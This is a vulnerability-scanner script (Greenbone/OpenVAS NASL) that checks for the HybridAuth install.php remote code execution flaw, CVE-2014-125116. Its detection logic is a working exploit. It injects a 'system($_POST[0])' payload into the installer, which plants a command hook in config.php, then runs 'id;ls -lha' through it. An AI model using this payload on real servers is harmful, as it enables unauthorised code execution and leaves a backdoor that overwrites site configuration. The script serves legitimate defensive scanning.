# SPDX-FileCopyrightText: 2014 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.804753");
  script_version("2025-08-05T05:45:17+0000");
  script_cve_id("CVE-2014-125116");
  script_tag(name:"cvss_base", value:"10.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");
  script_tag(name:"last_modification", value:"2025-08-05 05:45:17 +0000 (Tue, 05 Aug 2025)");
  script_tag(name:"creation_date", value:"2014-08-26 10:58:06 +0530 (Tue, 26 Aug 2014)");
  script_name("HybridAuth <= 2.2.2 'install.php' RCE Vulnerability");
  # nb: The original version of the script was in ACT_ATTACK and exited if safe_checks was enabled
  # which didn't made much sense. As the code below might overwrite a config file or similar it was
  # moved to this category later.
  script_category(ACT_DESTRUCTIVE_ATTACK);
  script_copyright("Copyright (C) 2014 Greenbone AG");
  script_family("Web application abuses");
  script_dependencies("find_service.nasl", "no404.nasl", "webmirror.nasl",
                      "DDI_Directory_Scanner.nasl", "gb_php_http_detect.nasl",
                      "global_settings.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_xref(name:"URL", value:"https://www.vulncheck.com/advisories/hybridauth-unauth-rce-via-config-injection");
  script_xref(name:"URL", value:"https://www.exploit-db.com/exploits/34273");
  script_xref(name:"URL", value:"https://www.exploit-db.com/exploits/34390");
  script_xref(name:"URL", value:"https://packetstorm.news/files/id/127930");
  script_xref(name:"URL", value:"https://seclists.org/fulldisclosure/2014/Aug/10");
  script_xref(name:"URL", value:"https://github.com/hybridauth/hybridauth/issues/241");

  script_tag(name:"summary", value:"HybridAuth is prone to a remote code execution (RCE)
  vulnerability.");

  script_tag(name:"vuldetect", value:"Send a crafted exploit string via HTTP GET request and check
  whether it is able to execute the code remotely.");

  script_tag(name:"insight", value:"The flaw exists because the hybridauth/install.php script does
  not properly verify or sanitize user-uploaded files.");

  script_tag(name:"impact", value:"Successful exploitation will allow attacker to execute arbitrary
  code in the affected system.");

  script_tag(name:"affected", value:"HybridAuth version 2.1.2 and probably prior.");

  script_tag(name:"solution", value:"Update to version 2.2.2 or later.");

  script_tag(name:"solution_type", value:"VendorFix");
  script_tag(name:"qod_type", value:"remote_analysis");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("port_service_func.inc");
include("list_array_func.inc");

port = http_get_port( default:80 );

if( ! http_can_host_php( port:port ) )
  exit( 0 );

useragent = http_get_user_agent();
host = http_host_name( port:port );

foreach dir( make_list_unique( "/", "/auth", "/hybridauth", "/social", http_cgi_dirs( port:port ) ) ) {

  if( dir == "/" )
    dir = "";

  res = http_get_cache( item:dir + "/install.php",  port:port );

  if( ">HybridAuth Installer<" >< res ) {

    url = dir + "/install.php";

    postData = "OPENID_ADAPTER_STATUS=system($_POST[0]))));/*";

    req = string( "POST ", url, " HTTP/1.1\r\n",
                  "Host: ", host, "\r\n",
                  "User-Agent: ", useragent, "\r\n",
                  "Content-Type: application/x-www-form-urlencoded\r\n",
                  "Content-Length: ", strlen( postData ), "\r\n",
                  "\r\n", postData );

    res = http_keepalive_send_recv( port:port, data:req, bodyonly:FALSE );

    if( res =~ "^HTTP/1\.[01] 200" && "<title>HybridAuth Installer</title>" >< res ) {

      url = dir + "/config.php";
      postData = "0=id;ls -lha";

      req = string( "POST ", url, " HTTP/1.1\r\n",
                    "Host: ", host, "\r\n",
                    "User-Agent: ", useragent, "\r\n",
                    "Content-Type: application/x-www-form-urlencoded\r\n",
                    "Content-Length: ", strlen( postData ), "\r\n",
                    "\r\n", postData );

      res = http_keepalive_send_recv( port:port, data:req, bodyonly:FALSE );

      if( res =~ "uid=[0-9]+.*gid=[0-9]+" ) {
        report = http_report_vuln_url( url:url, port:port );
        security_message( port:port, data:report );
        exit( 0 );
      }
    }
  }
}

exit( 99 );
